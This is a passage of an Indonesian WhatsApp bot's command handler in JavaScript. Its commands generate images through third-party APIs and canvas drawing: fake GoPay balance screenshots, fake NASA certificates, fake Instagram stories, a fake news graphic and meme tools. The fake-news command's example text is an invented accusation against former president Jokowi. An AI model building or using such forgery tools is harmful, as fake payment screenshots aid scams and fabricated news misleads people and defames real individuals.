    console.error(e)
    reply('❌ Gagal membuat Fake OVO')
  }
}
break

case 'fakegopay': {
  if (!text) return example(`10000,150,0,Juni\n\nFormat: saldo,koin,terpakai,bulan`)

  let [saldo, koin, terpakai, bulan] = text.split(',')
  if (!saldo || !koin || !terpakai || !bulan) return example(`10000,150,0,Juni`)
  if (isNaN(saldo)) return reply('❌ Saldo harus berupa angka!')
  if (isNaN(koin)) return reply('❌ Koin harus berupa angka!')
  if (isNaN(terpakai)) return reply('❌ Terpakai harus berupa angka!')

  try {
    let api = `https://api.synoxcloud.biz.id/canvas/fake-gopay?saldo=${encodeURIComponent(saldo)}&koin=${encodeURIComponent(koin)}&terpakai=${encodeURIComponent(terpakai)}&bulan=${encodeURIComponent(bulan)}`

    await reyz.sendMessage(m.chat, {
      image: { url: api },
      caption: `乂 *FAKE GOPAY*\n\n💰 Saldo : Rp${Number(saldo).toLocaleString('id-ID')}\n🪙 Koin : ${Number(koin).toLocaleString('id-ID')}\n📉 Terpakai : ${Number(terpakai).toLocaleString('id-ID')}\n📅 Bulan : ${bulan}`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply('❌ Gagal membuat Fake GoPay')
  }
}
break

case 'fakemovi3': {
  if (!text) return example(`Jangan caper mu untuk mencari perhatian orang lain`)

  try {
    let quote = text.trim()
    let api = `https://api.synoxcloud.biz.id/canvas/quotes-v4?text=${encodeURIComponent(quote)}`

    await reyz.sendMessage(m.chat, {
      image: { url: api },
      caption: `🎬 *FAKE MOVI V3*\n\n💬 Text :\n${quote}`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply('❌ Gagal membuat Fake Movi V3')
  }
}
break

case 'fakemovi4': {
  if (!text) return example(`Jangan banyak kali bacot mu, sepakat?`)

  try {
    let quote = text.trim()
    let api = `https://api.synoxcloud.xyz/canvas/quotes-v5?text=${encodeURIComponent(quote)}`

    await reyz.sendMessage(m.chat, {
      image: { url: api },
      caption: `🎬 *FAKE MOVI V4*\n\n💬 Text :\n${quote}`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply('❌ Gagal membuat Fake Movi V4')
  }
}
break

case 'fakenasa': {
  let nama = args.join(" ")
  if (!nama) return example(`ReyzTzx`)

  try {
    let url = `https://api-nanzz.my.id/docs/api/maker/sertifikat-nasa.php?nama=${encodeURIComponent(nama)}`
    let res = await axios.get(url, { responseType: "arraybuffer" })
    let buffer = Buffer.from(res.data)

    await reyz.sendMessage(m.chat, {
      image: buffer,
      caption: `🎓 Sertifikat NASA berhasil dibuat\nNama: ${nama}`
    }, { quoted: qR9X })
  } catch (err) {
    console.error(err)
    reply("❌ Gagal membuat sertifikat NASA")
  }
}
break

case 'ttiqc': {
  if (!text) return example(`ReyzTzx,Just Friend kok cemburu😹,https://linkfoto.jpg`)

  let [username, pesan, avatar] = text.split(",")
  if (!username || !pesan || !avatar) return example(`ReyzTzx,Just Friend kok cemburu😹,https://linkfoto.jpg`)

  try {
    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    // FIX: API lama (api.synoxcloud.xyz) sudah mati, diganti ke api-nanzz.my.id
    let api = `https://api-nanzz.my.id/docs/api/maker/iqc-gambar.php?text=${encodeURIComponent(pesan)}&url=${encodeURIComponent(avatar)}&carrier=XL&battery=88&signal=4&sender=${encodeURIComponent(username)}&read=true`

    await reyz.sendMessage(m.chat, {
      image: { url: api },
      caption: `📱 *TikTok Quote Chat*\n\n👤 Username : ${username}\n💬 Pesan : ${pesan}`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply(`❌ Error:\n${e.message}`)
  }
}
break

case 'fakedj': {
  try {
    const https = require("https")
    const { createCanvas, loadImage, registerFont } = require("canvas")

    if (global.__canvasQuoteFont === undefined) {
      global.__canvasQuoteFont = "sans-serif"
      try {
        const FONT_DIR = path.join(__dirname, "fonts")
        const FONT_PATH = path.join(FONT_DIR, "Cinzel-Bold.ttf")
        const FONT_URL = "https://raw.githubusercontent.com/google/fonts/main/ofl/cinzel/static/Cinzel-Bold.ttf"

        if (!fs.existsSync(FONT_DIR)) fs.mkdirSync(FONT_DIR, { recursive: true })

        if (!fs.existsSync(FONT_PATH)) {
          await new Promise((resolve, reject) => {
            const file = fs.createWriteStream(FONT_PATH)
            https.get(FONT_URL, (res) => {
              if (res.statusCode !== 200) {
                file.close()
                fs.unlink(FONT_PATH, () => {})
                return reject(new Error(`HTTP ${res.statusCode}`))
              }
              res.pipe(file)
              file.on("finish", () => file.close(resolve))
            }).on("error", (err) => {
              fs.unlink(FONT_PATH, () => {})
              reject(err)
            })
          })
        }

        registerFont(FONT_PATH, { family: "QuoteFont" })
        global.__canvasQuoteFont = "QuoteFont"
      } catch (fontErr) {
        console.log("⚠️ Gagal load font custom, pakai font default:", fontErr.message)
      }
    }

    const FONT_FAMILY = global.__canvasQuoteFont

    if (!text) return example(`Kita tidak tumpang cuma redup jadi jangan takut bersaing,@ReyzTzx`)

    let [quote, author] = text.split(",")
    if (!quote) return example(`Kita tidak tumpang cuma redup jadi jangan takut bersaing,@ReyzTzx`)

    quote = quote.trim()
    author = author ? author.trim() : "@ReyzTzx"

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const bg = await loadImage("https://img2.pixhost.to/images/8924/743599313_rafaofficial.jpg")
    const canvas = createCanvas(bg.width, bg.height)
    const ctx = canvas.getContext("2d")
    ctx.drawImage(bg, 0, 0, bg.width, bg.height)

    const W = bg.width
    const H = bg.height

    const overlayX = W * 0.1
    const overlayY = H * 0.3
    const overlayW = W * 0.8
    const overlayH = H * 0.42

    ctx.save()
    ctx.globalAlpha = 0.35
    ctx.fillStyle = "#000015"
    ctx.beginPath()
    ctx.roundRect(overlayX, overlayY, overlayW, overlayH, 20)
    ctx.fill()
    ctx.globalAlpha = 1
    ctx.restore()

    const CENTER_X = W / 2
    const CENTER_Y = H * 0.51
    const MAX_WIDTH = W * 0.68
    const MAX_HEIGHT = H * 0.32

    function wrapText(ctx, text, maxWidth) {
      const words = text.trim().split(/\s+/)
      let lines = []
      let line = ""
      for (const word of words) {
        const testLine = line ? line + " " + word : word
        if (ctx.measureText(testLine).width > maxWidth) {
          if (line) lines.push(line)
          line = word
        } else {
          line = testLine
        }
      }
      if (line) lines.push(line)
      return lines
    }

    let fontSize = Math.floor(W * 0.065)
    let lines = []
    while (fontSize >= 24) {
      ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
      lines = wrapText(ctx, quote, MAX_WIDTH)
      const lineHeight = fontSize * 1.25
      const totalHeight = lines.length * lineHeight
      if (totalHeight <= MAX_HEIGHT) break
      fontSize -= 2
    }

    ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    const lineHeight = fontSize * 1.25
    const totalHeight = lines.length * lineHeight
    const startY = CENTER_Y - totalHeight / 2 + lineHeight / 2

    ctx.shadowColor = "#3377ff"
    ctx.shadowBlur = 24
    ctx.fillStyle = "#ddeeff"
    for (let i = 0; i < lines.length; i++) {
      ctx.fillText(lines[i], CENTER_X, startY + i * lineHeight)
    }

    ctx.shadowBlur = 0
    ctx.strokeStyle = "rgba(160, 80, 255, 0.6)"
    ctx.lineWidth = 1.5
    const dividerY = startY + totalHeight + 18
    ctx.beginPath()
    ctx.moveTo(CENTER_X - 90, dividerY)
    ctx.lineTo(CENTER_X + 90, dividerY)
    ctx.stroke()

    const authorSize = Math.floor(fontSize * 0.55)
    ctx.font = `bold ${authorSize}px "${FONT_FAMILY}"`
    ctx.fillStyle = "#cc88ff"
    ctx.shadowColor = "#aa44ff"
    ctx.shadowBlur = 16
    ctx.textAlign = "center"
    ctx.fillText(author, CENTER_X, dividerY + authorSize + 10)
    ctx.shadowBlur = 0

    const buffer = canvas.toBuffer("image/png")

    await reyz.sendMessage(m.chat, {
      image: buffer,
      caption: "✅ Canvas Quote Berhasil Dibuat — ReyzTzx"
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply(`❌ Error:\n${e.message}`)
  }
}
break

case "figure":
case "figure2":
case "cine": {
  try {
    const { ImageUploadService } = require("node-upload-images")

    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    let media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const service = new ImageUploadService("pixhost.to")
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), "reyz.jpg")
    fs.unlinkSync(media)

    const endpoint = {
      figure: "https://api.nexray.eu.cc/ephoto/v1/figure",
      figure2: "https://api.nexray.eu.cc/ephoto/v2/figure",
      cine: "https://api.nexray.eu.cc/ephoto/cinematic",
    }[command]

    const label = {
      figure: "Figure",
      figure2: "Figure V2",
      cine: "efek Cinematic",
    }[command]

    const response = await axios({
      method: "GET",
      url: `${endpoint}?url=${encodeURIComponent(directLink)}`,
      responseType: "arraybuffer",
      validateStatus: () => true
    })

    const contentType = response.headers["content-type"] || ""

    if (contentType.startsWith("image/")) {
      return await reyz.sendMessage(m.chat, {
        image: Buffer.from(response.data),
        caption: `✅ Berhasil membuat ${label}.`
      }, { quoted: qR9X })
    }

    let json = {}
    try { json = JSON.parse(Buffer.from(response.data).toString()) } catch {}

    if (!json.status) return reply(`❌ ${json.error || json.message || "Gagal memproses gambar."}`)

    let hasil = json.result || json.result_url || json.url || json.image || json.output || json.data?.url || json.data?.result
    if (!hasil) return reply("❌ URL hasil tidak ditemukan.")

    await reyz.sendMessage(m.chat, {
      image: { url: hasil },
      caption: `✅ Berhasil membuat ${label}.`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e.response?.data || e)
    reply(`❌ Error\n${e.response?.data?.error || e.response?.data?.message || e.message}`)
  }
}
break

case "tohitam":
case "toghibli":
case "tosketch":
case "tomakkah":
case "tojepang": {
  let media
  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    // NOTE (v2): API lama (api-nexaku) sudah mati, diganti ke api-nanzz.my.id
    // yang butuh URL gambar publik (bukan upload file langsung), jadi
    // gambarnya di-upload dulu ke Catbox baru dilempar ke API transformasinya.
    const endpoint = {
      tohitam: "https://api-nanzz.my.id/docs/api/ai-image/to-ireng.php",
      toghibli: "https://api-nanzz.my.id/docs/api/ai-image/to-ghibli.php",
      tosketch: "https://api-nanzz.my.id/docs/api/ai-image/to-skecth.php",
      tomakkah: "https://api-nanzz.my.id/docs/api/ai-image/to-makkah.php",
      tojepang: "https://api-nanzz.my.id/docs/api/ai-image/to-jepang.php",
    }[command]

    const label = {
      tohitam: "Hitam Putih",
      toghibli: "Ghibli AI",
      tosketch: "Sketsa",
      tomakkah: "Latar Makkah",
      tojepang: "Latar Jepang",
    }[command]

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `${endpoint}?url=${encodeURIComponent(imageUrl)}`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `✅ Gambar berhasil diubah menjadi style ${label}.`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "chreact": {
    if (!text) return reply(`Contoh:\n${prefix + command} https://whatsapp.com/channel/xxx/6767|🖕,😠`)

    const [link, emoji] = text.split("|")

    if (!link || !emoji) {
        return reply(`Format salah!\n\nContoh:\n${prefix + command} https://whatsapp.com/channel/xxx/6767|🖕,😠`)
    }

    try {
        const api = `https://api.synoxcloud.xyz/tools/reactch?link=${encodeURIComponent(link)}&emoji=${encodeURIComponent(emoji)}&apikey=FREE`

        const response = await axios.get(api)
        const result = response.data

        reply(
            typeof result === "string"
                ? result
                : JSON.stringify(result, null, 2)
        )
    } catch (error) {
        reply(`Error: ${error.response?.data?.message || error.message}`)
    }
}
break

case "tocomic":
case "tochibi": {
  let media
  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const FormData = require("form-data")
    const endpoint = {
      tocomic: "https://api-nexaku.my.id/transform/comic",
      tochibi: "https://api-nexaku.my.id/transform/chibi",
    }[command]

    const label = {
      tocomic: "Comic AI",
      tochibi: "Chibi AI",
    }[command]

    media = await reyz.downloadAndSaveMediaMessage(qmsg)

    let form = new FormData()
    form.append("file", fs.createReadStream(media))

    let { data } = await axios.post(endpoint, form, {
      headers: { ...form.getHeaders() },
      responseType: "arraybuffer",
      maxBodyLength: Infinity,
      maxContentLength: Infinity
    })

    if (fs.existsSync(media)) fs.unlinkSync(media)

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `✅ Gambar berhasil diubah menjadi style ${label}.`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "hoax":
case "wasted": {
  let media
  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const endpoint = {
      hoax: "https://api-nanzz.my.id/docs/api/maker/hoax.php",
      wasted: "https://api-nanzz.my.id/docs/api/maker/wasted.php",
    }[command]

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `${endpoint}?url=${encodeURIComponent(imageUrl)}`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `✅ Berhasil membuat efek ${capital(command)}.`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "wanted": {
  let media
  if (!text) return example(`Jokowi Dodo,150.000.000 (reply foto)`)

  let [nama, harga] = text.split(',')
  if (!nama || !harga) return example(`Jokowi Dodo,150.000.000 (reply foto)`)

  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/wanted.php?nama=${encodeURIComponent(nama.trim())}&harga=${encodeURIComponent(harga.trim())}&url=${encodeURIComponent(imageUrl)}`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `🤠 *WANTED*\n\n👤 Nama: ${nama.trim()}\n💰 Harga: ${harga.trim()}`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "iqcgambar": {
  let media
  if (!text) return example(`wikwokdetok (reply foto)`)

  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/iqc-gambar.php?text=${encodeURIComponent(text)}&url=${encodeURIComponent(imageUrl)}&carrier=XL&battery=88&signal=4&sender=other&read=true`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `📱 *IQC Gambar*\n\n💬 ${text}`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "fakeberita": {
  let media
  if (!text) return example(`Viral! Jokowi mencuri 19jt lapangan pekerjaan dari anaknya (reply foto)`)

  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/berita.php?text=${encodeURIComponent(text)}&url=${encodeURIComponent(imageUrl)}`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `📰 *Fake Berita*\n\n${text}`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "fakestoryig": {
  let media
  if (!text) return example(`ReyzTzx,Halagi ka? (reply foto)`)

  let [username, pesanIg] = text.split(',')
  if (!username || !pesanIg) return example(`ReyzTzx,Halagi ka? (reply foto)`)

  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-story-ig.php?username=${encodeURIComponent(username.trim())}&text=${encodeURIComponent(pesanIg.trim())}&url=${encodeURIComponent(imageUrl)}`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `📸 *Fake Story IG*\n\n👤 ${username.trim()}\n💬 ${pesanIg.trim()}`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "fakestoryig2": {
  let media
  if (!text) return example(`ReyzTzx,Halagi ka? (reply foto)`)

  let [username2, pesanIg2] = text.split(',')
  if (!username2 || !pesanIg2) return example(`ReyzTzx,Halagi ka? (reply foto)`)

  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-story-ig2.php?username=${encodeURIComponent(username2.trim())}&text=${encodeURIComponent(pesanIg2.trim())}&url=${encodeURIComponent(imageUrl)}`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `📸 *Fake Story IG V2*\n\n👤 ${username2.trim()}\n💬 ${pesanIg2.trim()}`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "fakedev": {
  let media
  if (!text) return example(`ReyzTzx,Have a Great Code (reply foto)`)

  let [namaDev, bioDev] = text.split(',')
  if (!namaDev || !bioDev) return example(`ReyzTzx,Have a Great Code (reply foto)`)

  try {
    if (!/image/.test(mime)) return example(`(reply foto)`)

    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    media = await reyz.downloadAndSaveMediaMessage(qmsg)
    const imageUrl = await uploader.catbox(media)
    if (fs.existsSync(media)) fs.unlinkSync(media)

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fakedev.php?nama=${encodeURIComponent(namaDev.trim())}&bio=${encodeURIComponent(bioDev.trim())}&fotourl=${encodeURIComponent(imageUrl)}`
    let { data } = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(data),
      caption: `👨‍💻 *Fake Dev Profile*\n\n👤 ${namaDev.trim()}\n📝 ${bioDev.trim()}`
    }, { quoted: qR9X })
  } catch (e) {
    if (media && fs.existsSync(media)) fs.unlinkSync(media)
    console.error(e.response?.data || e)
    reply(`❌ Gagal memproses gambar\n${e.response?.status || ""}\n${e.message}`)
  }
}
break

case "randompap":
case "pap": {
  try {
    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    let res = await axios.get("https://api-nanzz.my.id/docs/api/random/random-pap.php", {
      responseType: "arraybuffer"
    })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: "✅ *Random Pap* — ReyzTzx"
    }, { quoted: qR9X })
  } catch (err) {
    console.error(err)
    reply(`❌ Error: ${err.message}`)
  }
}
break

case "randommemepresiden": {
  try {
    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    let res = await axios.get("https://api-nanzz.my.id/docs/api/random/random-meme-presiden.php", {
      responseType: "arraybuffer"
    })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: "✅ *Random Meme Presiden* — ReyzTzx"
    }, { quoted: qR9X })
  } catch (err) {
    console.error(err)
    reply(`❌ Error: ${err.message}`)
  }
}
break

case "carbon": {
  if (!text) return example(`javascript,console.log("Hello World");`)

  let lang = "javascript"
  let code = text

  if (/^[a-zA-Z0-9]+,/.test(text)) {
    let idx = text.indexOf(',')
    lang = text.slice(0, idx).trim()
    code = text.slice(idx + 1).trim()
  }

  try {
    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/carbon-code.php?text=${encodeURIComponent(code)}&lang=${encodeURIComponent(lang)}`
    let res = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: `✅ Carbon Code (${lang})`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e.response?.data || e)
    reply(`❌ Gagal membuat carbon code.\n${e.message}`)
  }
}
break

case "playbutton": {
  if (!text) return example(`ReyzTzx,silver`)

  let [namaBtn, template] = text.split(',')
  if (!namaBtn) return example(`ReyzTzx,silver`)
  template = template ? template.trim() : "silver"

  try {
    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/play-button.php?nama=${encodeURIComponent(namaBtn.trim())}&template=${encodeURIComponent(template)}`
    let res = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: `▶️ Play Button - ${namaBtn.trim()}`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e.response?.data || e)
    reply(`❌ Gagal membuat play button.\n${e.message}`)
  }
}
break

case "fakeffsquad": {
  if (!text) return example(`Nanzz,Azzam,Rizky,Budi`)

  let squad = text.split(',').map(v => v.trim()).filter(Boolean)
  if (squad.length < 2) return example(`Nanzz,Azzam,Rizky,Budi`)

  try {
    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const params = squad.slice(0, 4).map((n, i) => `nama${i + 1}=${encodeURIComponent(n)}`).join('&')
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ff-squad.php?${params}`
    let res = await axios.get(apiUrl, { responseType: "arraybuffer" })

    await reyz.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: `🎮 *FAKE LOBBY FF SQUAD*\n\n👥 ${squad.join(', ')}`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e.response?.data || e)
    reply(`❌ Gagal membuat Fake Lobby FF Squad.\n${e.message}`)
  }
}
break

case 'fakeff':
case 'fakelobbyff': {
  if (!text) return example(`ReyzTzx`)

  try {
    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const apiUrl = `https://api.nexray.web.id/maker/fakelobyff?nickname=${encodeURIComponent(text)}`
    const res = await fetch(apiUrl, { headers: { 'Accept': 'image/*', 'User-Agent': 'Mozilla/5.0' } })
    if (!res.ok) throw new Error(`HTTP ${res.status}`)

    const contentType = res.headers.get('content-type') || ''
    if (!contentType.includes('image')) throw new Error('Response bukan gambar')

    const buffer = Buffer.from(await res.arrayBuffer())
    if (!buffer || buffer.length < 1000) throw new Error('Gambar kosong atau rusak')

    await reyz.sendMessage(m.chat, {
      image: buffer,
      caption: `🎮 *FAKE LOBBY FREE FIRE*\n\n👤 Nickname: ${text}\n✅ Berhasil dibuat`
    }, { quoted: qR9X })
  } catch (err) {
    console.error('FAKEFF ERROR:', err)
    reply(`❌ Gagal membuat Fake Lobby FF\n\nError: ${err.message || err}`)
  }
}
break

case 'meme':
case 'randommeme': {
  try {
    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const res = await fetch('https://api-nanzz.my.id/docs/api/random/meme.php')
    if (!res.ok) throw new Error(`HTTP ${res.status}`)

    const contentType = res.headers.get('content-type') || ''
    if (!contentType.includes('image')) throw new Error('Response bukan gambar')

    const buffer = Buffer.from(await res.arrayBuffer())
    if (buffer.length < 1000) throw new Error('Gambar kosong atau rusak')

    await reyz.sendMessage(m.chat, {
      image: buffer,
      caption: `😂 *RANDOM MEME*\n\n✅ Berhasil mendapatkan meme random.\n\n🔄 Ketik *.randommeme* untuk meme lainnya.`
    }, { quoted: qR9X })
  } catch (e) {
    console.error('RANDOM MEME ERROR:', e)
    reply(`❌ Gagal mengambil meme.\n\n${e.message}`)
  }
}
break

case 'fakenokia2': {
  if (!text) return example(`Halo dunia,ReyzTzx`)

  let argsx = text.split(',')
  if (argsx.length < 2) return example(`Halo dunia,ReyzTzx`)

  let pesanNokia = argsx[0].trim()
  let senderNokia = argsx.slice(1).join(',').trim()

  try {
    let imageUrl = `https://api-nanzz.my.id/docs/api/maker/nokia-msg.php?sender=${encodeURIComponent(senderNokia)}&pesan=${encodeURIComponent(pesanNokia)}`

    await reyz.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: `📱 *Fake Nokia Message*\n\n📝 Text: ${pesanNokia}\n👤 Sender: ${senderNokia}`
    }, { quoted: qR9X })
  } catch (err) {
    console.error(err)
    reply('❌ Gagal membuat Fake Nokia Message!')
  }
}
break

case 'fakewindos': {
  try {
    if (!text) return example(`Kenapa ya yang tulus sering kalah`)

    const { createCanvas, loadImage, registerFont } = require('canvas')
    const https = require('https')
    const http = require('http')

    const FONT_URL = 'https://raw.githubusercontent.com/skayhayato-cmyk/canvas/main/Arial%20Bold.ttf'
    const BG_URL = 'https://api.nexadev.my.id/uploder/uploads/OIqmKC.jpg'

    const FONT_PATH = path.join(__dirname, 'assets', 'ArialBold.ttf')
    const BG_PATH = path.join(__dirname, 'assets', 'bg.jpg')

    fs.mkdirSync(path.join(__dirname, 'assets'), { recursive: true })

    const downloadFile = (url, dest) => new Promise((resolve, reject) => {
      if (fs.existsSync(dest)) return resolve()
      const file = fs.createWriteStream(dest)
      const client = url.startsWith('https') ? https : http
      client.get(url, (res) => {
        if (res.statusCode !== 200) {
          fs.unlink(dest, () => {})
          return reject(new Error(`HTTP ${res.statusCode}`))
        }
        res.pipe(file)
        file.on('finish', () => file.close(resolve))
      }).on('error', (err) => {
        fs.unlink(dest, () => {})
        reject(err)
      })
    })

    await downloadFile(FONT_URL, FONT_PATH)
    await downloadFile(BG_URL, BG_PATH)
    registerFont(FONT_PATH, { family: 'ArialBold' })

    const linesWin = text.split('\n').map(v => v.trim()).filter(Boolean)
    const bg = await loadImage(BG_PATH)
    const W = bg.width
    const H = bg.height

    const canvas = createCanvas(W, H)
    const ctx = canvas.getContext('2d')
    ctx.drawImage(bg, 0, 0, W, H)

    const BOX_X = W * 0.003
    const BOX_Y = H * 0.301
    const BOX_W = W * 0.735
    const BOX_H = H * 0.469
    const DROP_PAD_TOP = BOX_H * 0.025
    const DROP_PAD_BOTTOM = BOX_H * 0.15
    const DROP_Y = BOX_Y + DROP_PAD_TOP
    const DROP_H = BOX_H - DROP_PAD_TOP - DROP_PAD_BOTTOM
    const TEXT_X = W * 0.118
    const TEXT_MAX_W = BOX_W * 0.50

    function wrapLine(ctx, text, maxWidth) {
      const words = text.split(' ')
      const wrapped = []
      let current = ''
      for (const word of words) {
        const test = current ? current + ' ' + word : word
        if (ctx.measureText(test).width > maxWidth && current) {
          wrapped.push(current)
          current = word
        } else {
          current = test
        }
      }
      if (current) wrapped.push(current)
      return wrapped.length ? wrapped : [text]
    }

    const FIXED_FONT = Math.floor(H * 0.11)
    const MIN_FONT = 10
    let fontSize = FIXED_FONT
    let wrappedLines = []
    ctx.textBaseline = 'top'

    while (fontSize >= MIN_FONT) {
      ctx.font = `${fontSize}px ArialBold`
      wrappedLines = linesWin.flatMap(l => wrapLine(ctx, l, TEXT_MAX_W))
      const lineH = fontSize * 1.30
      const totalH = wrappedLines.length * lineH
      if (totalH <= DROP_H) break
      fontSize -= 2
    }

    const lineHeight = fontSize * 1.30
    const startY = DROP_Y + (DROP_H - (wrappedLines.length * lineHeight)) / 2

    ctx.save()
    ctx.beginPath()
    ctx.rect(BOX_X, BOX_Y, BOX_W, BOX_H)
    ctx.clip()
    ctx.font = `${fontSize}px ArialBold`
    ctx.fillStyle = '#111111'

